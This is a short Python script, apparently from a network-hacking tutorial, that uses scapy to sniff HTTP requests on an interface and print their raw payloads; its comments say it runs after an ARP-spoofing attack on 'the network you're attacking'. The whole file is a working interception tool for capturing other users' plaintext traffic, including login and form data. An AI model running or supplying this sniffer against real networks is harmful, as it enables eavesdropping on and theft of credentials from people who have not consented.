#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http

# read intercepted packets
# first you start arp_spoof then packet_sniffer
# it will read the most interesting packets


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            print(packet[scapy.Raw].load)


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
    # filter: udp, atp, port 80, etc...


sniff("eth0")  # eth0 - network you're attacking (can be anything, check it first)
